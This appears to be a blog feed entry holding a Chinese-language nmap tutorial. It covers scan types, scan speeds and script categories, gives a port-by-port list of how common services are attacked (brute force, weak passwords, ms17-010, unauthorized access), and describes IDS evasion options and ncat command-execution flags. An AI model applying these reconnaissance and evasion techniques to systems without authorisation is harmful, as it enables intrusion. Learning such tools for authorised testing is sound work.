        <content type="html"><![CDATA[<h1 id="nmap扫描工具的使用"><a href="#nmap扫描工具的使用" class="headerlink" title="nmap扫描工具的使用"></a>nmap扫描工具的使用</h1><h3 id="1-基本使用-无参数"><a href="#1-基本使用-无参数" class="headerlink" title="1. 基本使用 无参数"></a>1. 基本使用 无参数</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.56.*nmap <span class="token number">192.168</span>.56.0/24nmap <span class="token number">192.168</span>.56.100-200nmap <span class="token number">192.168</span>.56.137,166,177nmap www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-扫描方式"><a href="#2-扫描方式" class="headerlink" title="2. 扫描方式"></a>2. 扫描方式</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token number">192.168</span>.56.0/24 <span class="token comment"># -sS 隐蔽扫描(半开syn)</span>nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.56.0/24 <span class="token comment"># -sP 进行ping扫描</span>nmap <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.56.0/24 <span class="token comment"># -sT 3次握手方式tcp的扫描 会在目标主机的日志中会记录大批的连接请求以及错误信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-扫描速度"><a href="#3-扫描速度" class="headerlink" title="3. 扫描速度"></a>3. 扫描速度</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sn</span> <span class="token number">192.168</span>.56.100-200 <span class="token comment"># -sn 仅发现子网中的活动主机，不去扫描端口信息</span>nmap <span class="token parameter variable">-sn</span> <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.0/24 <span class="token comment"># -T 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-扫描信息"><a href="#4-扫描信息" class="headerlink" title="4. 扫描信息"></a>4. 扫描信息</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># -F 快速扫描端口</span>nmap -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># -p- 全端口扫描</span>nmap -p- <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># -sV 服务版本</span>nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># 扫描目标地址进行操作系统版本</span>nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># OS识别,版本探测,脚本扫描和综合扫描</span>nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># -Pn 不使用ping命令</span>nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sA</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># -sA  tcp ACK扫描</span>nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sO</span> <span class="token number">192.168</span>.56.1 <span class="token comment"># -sO 确定主机协议 icmp|igmp|tcp|udp|esp|ah|ipv6-icmp ...</span>nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sA</span> <span class="token parameter variable">-oA</span> testdir <span class="token number">192.168</span>.56.1 <span class="token comment"># -oA 同时以三种主要格式输出到 testdir</span>nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sA</span> <span class="token parameter variable">-oN</span> test.txt <span class="token number">192.168</span>.56.1 <span class="token comment"># -oN 输出扫描结果(txt) -oX/-oS/-oG -> XML/nmap/gnmap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-扫描脚本"><a href="#5-扫描脚本" class="headerlink" title="5. 扫描脚本"></a>5. 扫描脚本</h3><blockquote><p>Nmap脚本分类<br>auth: 负责处理鉴权证书（绕开鉴权）的脚本 （检测弱口令 ）<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br>brute: 提供暴力破解方式，针对常见的应用如http&#x2F;snmp等<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞<br>intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">--script</span><span class="token operator">=</span>vuln <span class="token number">192.168</span>.3.26 <span class="token comment"># --script=vuln 指定vuln类型脚本</span>nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">--script</span><span class="token operator">=</span>all <span class="token number">192.168</span>.3.26 <span class="token comment"># --script=all 执行所有脚本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="6-常见端口及利用方式"><a href="#6-常见端口及利用方式" class="headerlink" title="6. 常见端口及利用方式"></a>6. 常见端口及利用方式</h3><blockquote><p>tcp 21 ftp 默认的数据和命令传输端口[可明文亦可加密传输] 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)<br>tcp 22 ssh[数据ssl加密传输] 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…<br>tcp 23 telnet[明文传输] 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获<br>tcp 25 smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务] 邮件伪造,vrfy&#x2F;expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑<br>tcp&#x2F;udp 53 dns[域名解析] 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控<br>tcp&#x2F;udp 69 tftp[简单文件传输协议,无认证] 尝试下载目标及其的各类重要配置文件 tcp<br>80-89,443,8440-8450,8080-8089 web[各种常用的web服务端口] 各种常用web服务端口,可尝试经典的top n,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……<br>tcp 110 [邮局协议,可明文可密文] 可尝试爆破,嗅探<br>tcp 137,139,445 samba[smb实现windows和linux间文件共享,明文] 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……<br>tcp 143  imap[可明文可密文] 可尝试爆破<br>udp 161 snmp[明文] 爆破默认团队字符串,搜集目标内网信息<br>tcp 389 ldap[轻量级目录访问协议] ldap注入,允许匿名访问,弱口令<br>tcp 512,513,514 linux rexec 可爆破,rlogin登陆<br>tcp 873 rsync备份服务 匿名访问,文件上传 tcp 1194 open。。。 想办法钓。。。账号,进内网<br>tcp 1352 Lotus domino邮件服务 弱口令,信息泄漏,爆破<br>tcp 1433 mssql数据库 注入,提权,sa弱口令,爆破<br>tcp 1521 oracle数据库 tns爆破,注入,弹shell…<br>tcp 1500 ispmanager 主机控制面板 弱口令<br>tcp 1025,111,2049 nfs 权限配置不当<br>tcp 1723 pptp 爆破,想办法钓。。。账号,进内网<br>tcp 2082,2083 cpanel主机管理面板登录 弱口令<br>tcp 2181 zookeeper 未授权访问<br>tcp 2601,2604 zebra路由 默认密码zerbra<br>tcp 3128 squid代理服务 弱口令<br>tcp 3312,3311 kangle主机管理登录 弱口令<br>tcp 3306 mysql数据库 注入,提权,爆破<br>tcp 3389 windows rdp远程桌面 shift后门,爆破,ms12-020[蓝屏exp]<br>tcp 4848 glassfish控制台 弱口令<br>tcp 4899 radmin远程桌面管理工具, 抓密码拓展机器<br>tcp 5000 sybase&#x2F;DB2数据库 爆破,注入<br>tcp 5432 postgresql数据库 爆破,注入,弱口令<br>tcp 5632 pcanywhere远程桌面管理工具 抓密码,代码执行<br>tcp 5900,5901,5902 vnc远程桌面管理工具 弱口令爆破,如果信息搜集不到位,成功几率很小<br>tcp 5984 CouchDB 未授权导致的任意指令执行<br>tcp 6379 redis未授权 可尝试未授权访问,弱口令爆破<br>tcp 7001,7002 weblogic控制台 java反序列化,弱口令<br>tcp 7778 kloxo 主机面板登录<br>tcp 8000 Ajenti主机控制面板 弱口令<br>tcp 8443 plesk主机控制面板 弱口令<br>tcp 8069 zabbix 远程执行,sql注入<br>tcp 8080-8089 Jenkins,jboss 反序列化,控制台弱口令<br>tcp 9080-9081,9090 websphere控制台 java反序列化&#x2F;弱口令<br>tcp 9200,9300 elasticsearch 远程执行<br>tcp 10000 webmin linux主机web控制面板入口 弱口令<br>tcp 11211 memcached 未授权访问<br>tcp 27017,27018 mongodb 爆破,未授权访问<br>tcp 3690 svn服务 svn泄露,未授权访问<br>tcp 50000 SAP Management Console 远程执行<br>tcp 50070,50030 hadoop 默认端口未授权访问</p></blockquote><h3 id="7-全部参数"><a href="#7-全部参数" class="headerlink" title="7. 全部参数"></a>7. 全部参数</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--system-dns 使用系统域名解析器解析<span class="token punctuation">(</span>慢<span class="token punctuation">)</span>。--dns-server 服务器 选择dns解析。<span class="token comment"># 时间性能优化：</span><span class="token parameter variable">-T</span> 时间优化<span class="token punctuation">(</span><span class="token number">0</span>-5<span class="token punctuation">)</span><span class="token punctuation">(</span>paranoid<span class="token operator">|</span>sneaky<span class="token operator">|</span>polite<span class="token operator">|</span>normal<span class="token operator">|</span>aggressive<span class="token operator">|</span>insane<span class="token punctuation">)</span><span class="token parameter variable">-F</span> 快速扫描。--max-retries 调整重传次数。--min-hostgroup / --max-hostgroup size 设置组的大小--min-parallelism / --max-parellelism time指定时间内的探针数--min-rtt-timrout / --max-rtt-timrout/initial-rtt-timrouttime 指定探针超时--scan-delay / -max-scan-delay <span class="token function">time</span> 指定探针之间的时延--max-retries tries 指定探针重传转发数--host-timeout <span class="token function">time</span> 设置扫描主机的最大时间--defeat-rst-ratelimit 设置rst的限制<span class="token parameter variable">-A</span> 综合扫描。<span class="token parameter variable">-p</span> 端口【-数 数以内 数- 大于数--p-所有 U udp T tcp 服务 <span class="token punctuation">[</span>数-数<span class="token punctuation">]</span>端口】。<span class="token parameter variable">--allports</span> 不为探测版本排除任何端口。<span class="token parameter variable">-e</span> 指定网络接口 。<span class="token parameter variable">-r</span> 顺序扫描。<span class="token parameter variable">-O</span> 系统扫描。--osscan-limit 。<span class="token punctuation">(</span>针对指定的目标进行操作系统检测<span class="token punctuation">)</span>--osscan-guess<span class="token punctuation">;</span> <span class="token parameter variable">--fuzzy</span> 。<span class="token punctuation">(</span>推测操作系统检测结果<span class="token punctuation">)</span> --version-light<span class="token punctuation">[</span>轻<span class="token punctuation">]</span>-all<span class="token punctuation">[</span>全<span class="token punctuation">]</span><span class="token number">1</span>-9<span class="token punctuation">(</span>探针强度<span class="token punctuation">)</span>--version-intensity<span class="token punctuation">[</span><span class="token number">0</span>-9<span class="token punctuation">]</span>默认7<span class="token punctuation">(</span>探针强度<span class="token punctuation">)</span>--version-trace获取详细的探针信息。<span class="token parameter variable">-v</span> 强度小 <span class="token parameter variable">-D</span> 大一点 <span class="token parameter variable">-d</span> 加强 <span class="token parameter variable">-p</span> 最debug信息。<span class="token punctuation">(</span>V<span class="token operator">&lt;</span>v<span class="token operator">&lt;</span>D<span class="token operator">&lt;</span>d<span class="token operator">&lt;&lt;</span>p<span class="token punctuation">)</span><span class="token parameter variable">-d</span> <span class="token punctuation">[</span>level<span class="token punctuation">]</span> <span class="token punctuation">(</span>提高或设置调试级别<span class="token punctuation">)</span> 。 <span class="token parameter variable">-sT</span> tcp端口扫描<span class="token punctuation">(</span>完整三次握手<span class="token punctuation">)</span>。<span class="token parameter variable">-sU</span> udp扫描。<span class="token punctuation">(</span>不回应可能端口打开,回应是关闭<span class="token punctuation">)</span> <span class="token parameter variable">-sL</span> dns反向解析。    <span class="token parameter variable">-sM</span> <span class="token punctuation">[</span>fin ack mainmon扫描<span class="token punctuation">]</span> 。<span class="token parameter variable">-sS</span> 隐蔽扫描<span class="token punctuation">(</span>半开syn<span class="token punctuation">)</span>。<span class="token parameter variable">-sP</span> 发现扫描网络存活主机。<span class="token punctuation">(</span>直连arp非直连tcp80 icmp<span class="token punctuation">)</span><span class="token parameter variable">-sO</span> 确定主机协议扫描。<span class="token parameter variable">-sA</span> tcp ACK扫描。<span class="token parameter variable">-sW</span> 对滑动窗口的扫描sI<span class="token punctuation">[</span>idlescan<span class="token punctuation">]</span>。<span class="token parameter variable">-sR</span> RPC扫描。<span class="token punctuation">(</span>flag没有syn,ack,rst回送rst<span class="token punctuation">)</span><span class="token parameter variable">-sN</span> 关闭主机发现【空】。<span class="token punctuation">(</span>不管是否存在直接扫描<span class="token punctuation">)</span><span class="token parameter variable">-sF</span> FIN扫描 。<span class="token punctuation">(</span>sN sF sX逃避不了ids<span class="token punctuation">)</span><span class="token parameter variable">-sX</span> Xmas扫描 <span class="token punctuation">(</span>fin psh urg为置位<span class="token punctuation">)</span>。<span class="token parameter variable">-sI</span> 完全隐藏。【以一个跳板主机<span class="token punctuation">&#123;</span>无流量<span class="token punctuation">&#125;</span>扫描另一台主机】<span class="token parameter variable">-sV</span> 服务版本。<span class="token parameter variable">-sC</span> 跟安全有关的脚本<span class="token parameter variable">-P0</span> 指定协议。<span class="token punctuation">(</span>不ping主机<span class="token punctuation">)</span><span class="token punctuation">(</span>1icmp6tcp17udp47gre50esp51ah53swipe77sun-nd115l2tp120uti132sctp<span class="token punctuation">)</span> <span class="token parameter variable">-PS</span> 端口列表用,隔开<span class="token punctuation">[</span>tcp80 syn 扫描<span class="token punctuation">]</span><span class="token parameter variable">-PA</span> 端口列表用,隔开<span class="token punctuation">[</span>ack扫描<span class="token punctuation">]</span><span class="token punctuation">(</span>PS+PA测试状态包过滤防火墙【非状态的PA可以过】<span class="token punctuation">)</span>【默认扫描端口1-1024】<span class="token parameter variable">-PU</span> 端口列表用,隔开<span class="token punctuation">[</span>udp高端口扫描 穿越只过滤tcp的防火墙<span class="token punctuation">]</span><span class="token parameter variable">-PE</span> <span class="token punctuation">[</span>icmp <span class="token function">ping</span> types<span class="token punctuation">]</span><span class="token parameter variable">-PM</span> 掩码请求。<span class="token parameter variable">-PR</span> <span class="token punctuation">[</span>arp ping<span class="token punctuation">]</span> 默认直连用。<span class="token parameter variable">-PN</span> 自己。<span class="token parameter variable">-PP</span> 时间请求。--send-ip 直连不做arp做ping。--reason返回原因。--packet-trace 跟踪发送和接收的报文。--traceroute追踪主机跳数。<span class="token parameter variable">--scanflags</span>  banner tcp扫描的flags。<span class="token parameter variable">--servicedb</span> 文件 在文件里指定扫描的服务。<span class="token parameter variable">--script</span><span class="token operator">=</span>脚本【all全部】<span class="token punctuation">(</span>promiscuous杂合模式<span class="token punctuation">)</span> 调用脚本。<span class="token punctuation">(</span>协议平台-服务-动作<span class="token punctuation">)</span> vulners--script-updatedb脚本升级<span class="token comment"># 输出：</span><span class="token parameter variable">-oS</span> <span class="token punctuation">(</span>ScRipT KIdd<span class="token operator">|</span>3oUTpuT<span class="token punctuation">)</span>保存扫描结果输出。-oN/oG <span class="token punctuation">(</span>Grep 输出<span class="token punctuation">)</span> <span class="token parameter variable">-oA</span> <span class="token punctuation">(</span>输出至所有格式<span class="token punctuation">)</span>--append-output 附在原来的结果前面。 <span class="token comment"># 输入：</span>-iL从列表中导入原来的扫描结果。-iR随机选择目标。--exclude排除主机或网络。--excludefile排除文件中的列表。--randomize-hosts随机主机。<span class="token parameter variable">--iL</span> 文件名 导入信息。--versiondb调用数据库。<span class="token comment"># 逃避技术</span><span class="token parameter variable">-f</span> <span class="token number">8</span>字节 <span class="token parameter variable">--mtu</span> int 指定分片字节。<span class="token parameter variable">-D</span> <span class="token operator">&lt;</span>ip,ip<span class="token operator">></span> 用诱饵掩盖扫描<span class="token parameter variable">-S</span> 源ip <span class="token parameter variable">--e</span> 出接口 欺骗ip和mac。--source-port 源端口<span class="token punctuation">;</span> <span class="token parameter variable">-g</span> <span class="token punctuation">(</span>源端口哄骗<span class="token punctuation">)</span>--spoof-mac <span class="token number">0</span>随便,厂商,自己指定 指定mac。--data-length <span class="token punctuation">(</span>发送报文时附加随机数据<span class="token punctuation">)</span>--date-length 填充随机数据。<span class="token parameter variable">--badsum</span> 发送tcp和udp校验和的包。<span class="token parameter variable">--ttl</span> <span class="token punctuation">(</span>设置IP time-to-live 域<span class="token punctuation">)</span> --ip-options ip选项。<span class="token comment"># 其他选项：</span><span class="token parameter variable">-b</span> FTP反弹攻击。<span class="token parameter variable">--open</span> 只显示open的。<span class="token parameter variable">--iflist</span> <span class="token punctuation">(</span>列举接口和路由<span class="token punctuation">)</span> <span class="token parameter variable">-6</span> <span class="token punctuation">(</span>启用IPv6扫描<span class="token punctuation">)</span>。<span class="token comment"># 例子：</span>nmap --spoof-mac Apple <span class="token parameter variable">--traceroute</span> --data-length <span class="token number">9</span> <span class="token parameter variable">-f</span> <span class="token parameter variable">-D</span> <span class="token number">192.168</span>.56.18 <span class="token parameter variable">-v</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-O</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-oA</span> resultdir --log-errors --append-output -p1-1024,1433,2222,2249,7778,8080,9999 --randomize-hosts <span class="token number">192.168</span>.56.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-nmap-端口状态"><a href="#8-nmap-端口状态" class="headerlink" title="8. nmap 端口状态"></a>8. nmap 端口状态</h3><blockquote><p>open 开放<br>closed 关闭<br>filterd 过滤<br>unfilterd 未过滤<br>open|filterd 开放或被过滤<br>closed|filterd 关闭或被过滤</p></blockquote><h3 id="9-ncat-的使用"><a href="#9-ncat-的使用" class="headerlink" title="9. ncat 的使用"></a>9. ncat 的使用</h3><blockquote><p>主机、端口 串联和重定向接口 (功能和nc有点相像)</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-4</span> ipv4 <span class="token parameter variable">-6</span> ipv6 <span class="token parameter variable">-u</span> udp <span class="token parameter variable">--sctp</span> sctp<span class="token parameter variable">-g</span> 发送松散源路由-G设定源路由指针<span class="token parameter variable">-p</span> 端口-s源主机<span class="token parameter variable">-l</span> 监听模式-m最大链接数--broker链接中间人--char聊天服务器--ssl使用ssl--ssl-verify验证服务器证书--ssl-cert指定证书--ssl-key指定私钥--ssl-trustfile名单信任的证书<span class="token parameter variable">--proxy</span> 主机:端口指定服务器--proxy-type 协议 指定协议--proxy-auth 用户:密码使用代理证书<span class="token parameter variable">-e</span> 命令 执行命令<span class="token parameter variable">--c</span> 命令 sh命令执行<span class="token parameter variable">--allow</span> 主机 允许链接<span class="token parameter variable">--allowfile</span> <span class="token function">file</span> 允许文件链接<span class="token parameter variable">--deny</span> 主机 拒绝链接<span class="token parameter variable">--denyfile</span> <span class="token function">file</span> 拒绝文件连接<span class="token parameter variable">-d</span> 时间 指定延时--I时间 指定空闲--w时间指定连接超时<span class="token parameter variable">-o</span> file保存信息<span class="token parameter variable">-x</span> 保存16进制信息<span class="token parameter variable">-v</span> 详细信息<span class="token parameter variable">-c</span> 使用CRLE去EOL顺序<span class="token parameter variable">-h</span> 帮助--recv-only 只接受--send-only 只发送<span class="token parameter variable">-t</span> 远程登录<span class="token parameter variable">--version</span> 显示版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-ndiff-的使用"><a href="#10-ndiff-的使用" class="headerlink" title="10. ndiff 的使用"></a>10. ndiff 的使用</h3><blockquote><p>文件比较工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Usage: ndiff <span class="token punctuation">[</span>option<span class="token punctuation">]</span> FILE1 FILE2Compare two Nmap XML files and display a list of their differences.Differences include <span class="token function">host</span> state changes, port state changes, and changes to<span class="token function">service</span> and OS detection.  -h, <span class="token parameter variable">--help</span>     display this <span class="token builtin class-name">help</span>  -v, <span class="token parameter variable">--verbose</span>  also show hosts and ports that haven't changed.  <span class="token parameter variable">--text</span>         display output <span class="token keyword">in</span> text <span class="token function">format</span> <span class="token punctuation">(</span>default<span class="token punctuation">)</span>  <span class="token parameter variable">--xml</span>          display output <span class="token keyword">in</span> XML <span class="token function">format</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-nping-的使用"><a href="#11-nping-的使用" class="headerlink" title="11. nping 的使用"></a>11. nping 的使用</h3><blockquote><p>网络数据包生成工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--tcp-connect  TCP连接方式.<span class="token parameter variable">--tcp</span>  TCP模式 <span class="token parameter variable">--udp</span>  UDP模式<span class="token parameter variable">--icmp</span> ICMP的模式<span class="token parameter variable">--arp</span>  ARP表/ RARP服务模式<span class="token parameter variable">--tr</span>   路由跟踪模式<span class="token parameter variable">-p</span> 端口 目标端口<span class="token parameter variable">-g</span> 端口 源端口<span class="token parameter variable">--seq</span> seqnumber 设置端口序列<span class="token parameter variable">--flags</span> 设置tcp的flags <span class="token punctuation">(</span>CWR,ECN,URG,ACK,PSH,RST,SYN,FIN<span class="token punctuation">)</span><span class="token parameter variable">--ack</span> 设置ack数<span class="token parameter variable">--win</span> 设置滑动窗口大小<span class="token parameter variable">--badsum</span> 使用错误校验 <span class="token parameter variable">--mss</span> 设置最大段大小。                   <span class="token parameter variable">--ws</span> 设置窗口的规模。<span class="token parameter variable">--ts</span> <span class="token operator">&lt;</span>echo,reply<span class="token operator">></span> 设置时间戳<span class="token punctuation">(</span>回音和答复场<span class="token punctuation">)</span>--icmp-type 设置icmp类型--icmp-code 设置icmp代码--icmp-id 设置icmp的标识符--icmp-seq 设置icmp顺序--icmp-redirect-addr 设置icmp重定向地址--icmp-param-pointer 设置icmp参数问题指针--icmp-advert-lifetime 设置icmp的生成周期--icmp-advert-entry <span class="token operator">&lt;</span>IP,pref<span class="token operator">></span> 设置icmp路由广告--icmp-orig-time  设置icmp原始时间戳--icmp-recv-time  设置icmp接受时间戳--icmp-trans-time 设置icmp发送的时间戳--arp-type arp类型<span class="token punctuation">(</span>ARP-reply, RARP, RARP-reply<span class="token punctuation">)</span>--arp-sender-mac 发送人的mac地址--arp-sender-ip  设置发件人ip地址--arp-target-mac 设置目标mac地址--arp-target-ip 设置目标ip地址<span class="token parameter variable">-S</span> 设置源ip地址--dest-ip 设置目标地址<span class="token parameter variable">--tos</span> 服务类型<span class="token parameter variable">--id</span> 标识<span class="token parameter variable">--df</span> 不要分段<span class="token parameter variable">--mf</span> 更多分段<span class="token parameter variable">--ttl</span> 生存时间--badsum-ip 无效ip校验 --ip-options <span class="token operator">&lt;</span>S<span class="token operator">|</span>R <span class="token punctuation">[</span>route<span class="token punctuation">]</span><span class="token operator">|</span>L<span class="token punctuation">[</span>route<span class="token punctuation">]</span><span class="token operator">|</span>T<span class="token operator">|</span>U <span class="token punctuation">..</span>.<span class="token operator">></span>设置IP选项--ip-options 设置ip选项<span class="token parameter variable">--mtu</span> 最大传输单元<span class="token parameter variable">-6</span> 使用ipv6--hop-limit 设置IPv6逐场的限制值发送到指定的数据包--traffic-class 交通类<span class="token parameter variable">--flow</span> 流标签--dest-mac 目标mac--source-mac 源mac--ether-type 以太网类型<span class="token parameter variable">--data</span> 附加到发送的数据包的自定义二进制数据--data-string 追加自定义的字符串发送的数据包--data-file 包括有效载荷从指定的文件--data-length 附加到发送的数据包随机数据<span class="token parameter variable">--delay</span> 延迟之间的探针<span class="token parameter variable">--rate</span> 发送速率探针在给定<span class="token parameter variable">--ec</span> 运行回声客户端<span class="token parameter variable">--es</span> 运行回声服务器<span class="token parameter variable">--ep</span> TCP端口号设置回声--nc禁用加密和验证<span class="token parameter variable">--once</span> 服务一个客户端并退出<span class="token parameter variable">-h</span> 显示帮助信息<span class="token parameter variable">--version</span>  显示nping的版本 <span class="token parameter variable">-c</span> 轮后停止给定数量<span class="token parameter variable">-e</span> 设置网络接口<span class="token parameter variable">-H</span> 不显示发送的数据包<span class="token parameter variable">-N</span> 不要试图捕捉回复<span class="token parameter variable">--privileged</span> 假设该用户完全权限 <span class="token parameter variable">--unprivileged</span> 假设用户缺少原始套接字权限 --send-eth 使用原始以太网发送--send-ip  IP层发送的原料--bpf-filter 自定义设置过滤器BPF<span class="token parameter variable">-v</span> 增加或设置输出的详细程度<span class="token parameter variable">-d</span> 增加或设置调试级别 <span class="token parameter variable">-q</span> 减少冗赘级别<span class="token parameter variable">--quiet</span> 冗长和调试级别设置到最低。<span class="token parameter variable">--debug</span> 冗长和调试设置到最大程度。<span class="token comment"># 基本使用</span>nping scanme.nmap.orgnping <span class="token parameter variable">--tcp</span> <span class="token parameter variable">-p</span> <span class="token number">80</span> <span class="token parameter variable">--flags</span> rst <span class="token parameter variable">--ttl</span> <span class="token number">2</span> <span class="token number">192.168</span>.1.1nping <span class="token parameter variable">--icmp</span> --icmp-type <span class="token function">time</span> <span class="token parameter variable">--delay</span> 500ms <span class="token number">192.168</span>.254.254nping --echo-server <span class="token string">"public"</span> <span class="token parameter variable">-e</span> wlan0 <span class="token parameter variable">-vvv</span>nping --echo-client <span class="token string">"public"</span> echo.nmap.org <span class="token parameter variable">--tcp</span> -p1-1024 <span class="token parameter variable">--flags</span> ack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hacktool </tag>
            
            <tag> scanner </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker搭建隧道代理池</title>
      <link href="/docker-channel-proxy/"/>
      <url>/docker-channel-proxy/</url>
      
